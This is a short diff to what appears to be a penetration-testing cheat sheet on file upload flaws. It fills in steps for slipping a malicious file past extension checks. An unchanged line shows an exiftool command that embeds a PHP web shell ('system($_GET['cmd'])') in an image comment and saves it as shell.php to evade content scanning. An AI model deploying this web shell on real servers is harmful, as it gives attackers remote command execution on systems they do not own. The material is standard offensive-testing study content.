@@ -22,10 +22,10 @@
 4. Browse to your file, is it executed?
 
 #Is it validating by extension?
-1.
-2.
-3.
-4.
+1. Create your malicious file.
+2. Upload and intercept the request.
+3. Change the extension to match what the application is expecting.
+4. Browse to your file, is it executed?
 
 #Is it scanning the content?
 exiftool -Comment="<?php system($_GET['cmd']); ?>" <YOUR-INPUT-IMAGE>.jpg -o shell.php
